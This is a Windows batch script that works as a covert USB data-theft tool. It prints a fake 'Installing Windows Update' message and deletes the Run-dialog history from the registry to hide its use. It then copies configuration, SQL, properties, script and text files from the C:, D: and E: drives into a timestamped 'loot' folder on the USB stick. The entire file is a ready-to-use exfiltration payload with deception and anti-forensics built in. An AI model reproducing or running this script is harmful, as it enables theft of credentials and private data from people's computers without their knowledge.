@echo off
@echo Installing Windows Update

REM Delete registry keys storing Run dialog history
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f

REM Set the location
set bpath=%~dp0
set broot=%bpath:~0,2%
set dst=%broot%\loot\improved-usb-extractor\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%
echo %dst%
set dst=%dst: =0%
echo %dst%

mkdir %dst% >>nul

set files=*.xml *.conf *.config *.properties *.sql *.cmd *.bat *.txt
set exclude_dirs=c:\Windows c:\Users "c:\Program Files" "C:\Program Files (x86)" c:\Applications c:\ProgramData

REM Highly unlikely that the PC / device has a directory called "loot"
if Exist C:\ (
if not "C:"=="%broot%" (
mkdir %dst%\C_Drive >>nul
echo "Running robocopy on C:\"
robocopy c:\ %dst%\C_Drive /S %files% /XD %exclude_dirs% /log:%dst%\C_Log.txt /tee /copy:dt /sl
)
)

if Exist D:\ (
if Not "D:"=="%broot%" (
mkdir %dst%\D_Drive >>nul
echo "Running robocopy on D:\"
robocopy d:\ %dst%\D_Drive /S %files% /XD %exclude_dirs% /log:%dst%\D_Log.txt /tee /copy:dt /sl
)
)

if Exist E:\ (
if Not "E:"=="%broot%" (
mkdir %dst%\E_Drive >>nul
echo "Running robocopy on E:\"
robocopy e:\ %dst%\E_Drive /S %files% /XD %exclude_dirs% /log:%dst%\E_Log.txt /tee /copy:dt /sl
)
)

@echo "Finished copying files!" >> %dst%\finished.txt
REM @cls
REM @exit
